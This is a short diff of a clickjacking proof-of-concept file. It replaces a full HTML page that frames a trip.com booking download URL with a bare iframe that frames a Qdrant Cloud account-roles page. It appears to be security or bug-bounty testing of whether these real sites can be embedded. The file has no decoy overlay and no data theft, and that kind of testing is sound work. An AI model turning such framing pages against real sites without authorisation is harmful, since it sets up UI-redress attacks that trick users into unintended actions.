@@ -1,31 +1,7 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clickjacking PoC</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            position: relative;
-            width: 100%;
-            height: 100vh;
-        }
-        .iframe-container {
-            width: 100%;
-            height: 100%;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-            border: 2px solid red; /* Visible border to see iframe clearly */
-        }
-    </style>
-</head>
-<body>
-    <div class="iframe-container">
-        <iframe src="https://ebooking.trip.com/ebkorderv3/download?" frameborder="0" width="100%" height="100%"></iframe>
-    </div>
-</body>
-</html>
+<iframe 
+  src="https://cloud.qdrant.io/accounts/cloud-access/roles/all-users" 
+  width="100%" 
+  height="800px" 
+  frameborder="0" 
+  allowfullscreen>
+</iframe>
